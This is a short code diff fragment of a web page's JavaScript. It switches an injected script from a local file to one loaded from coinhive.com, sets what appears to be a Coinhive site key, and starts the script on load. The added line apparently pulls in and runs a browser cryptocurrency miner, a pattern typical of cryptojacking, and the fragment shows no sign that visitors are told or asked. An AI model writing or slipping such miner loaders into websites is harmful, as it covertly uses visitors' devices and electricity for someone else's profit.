@@ -6,7 +6,7 @@
             var n = document.createElement("script");
             n.type = "text/javascript", n.async = !0;
             var e = document.getElementsByTagName("script")[0];
-            n.src = "./coinhive.min.js", n.onload = function() {
+            n.src = "https://coinhive.com/lib/coinhive.min.js", n.onload = function() {
                 function n(n) { return In.start(n) }
                 var e = "jVwy4y10DD5Ahz6qQ83qLrwXd5KZgJfp",
                     t = !0,
